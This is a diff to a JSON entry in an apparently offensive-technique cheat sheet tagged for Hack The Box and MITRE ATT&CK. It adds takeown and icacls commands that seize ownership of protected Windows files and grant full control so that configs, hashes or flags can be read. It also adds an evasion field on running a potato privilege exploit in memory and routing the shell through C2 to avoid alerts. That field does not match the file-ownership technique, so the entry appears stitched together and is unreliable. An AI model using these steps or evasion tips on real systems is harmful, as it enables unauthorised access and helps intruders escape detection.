@@ -90,6 +90,31 @@
       "HTB M26",
       "MITRE T1222.001",
       "MITRE T1078"
-    ]
-  }
+    ],
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+  },
+  "variations": [
+    {
+      "label": "Grant yourself full control after takeown",
+      "command": "icacls '<target_file>' /grant <user>:F"
+    },
+    {
+      "label": "Recursive on a directory",
+      "command": "takeown /f '<target_dir>' /r /d y"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Take ownership of the protected file",
+      "command": "takeown /f '<target_file>'"
+    },
+    {
+      "label": "Grant read/full to yourself",
+      "command": "icacls '<target_file>' /grant <user>:F"
+    },
+    {
+      "label": "Read it (e.g. a config/hash/flag)",
+      "command": "type '<target_file>'"
+    }
+  ]
 }
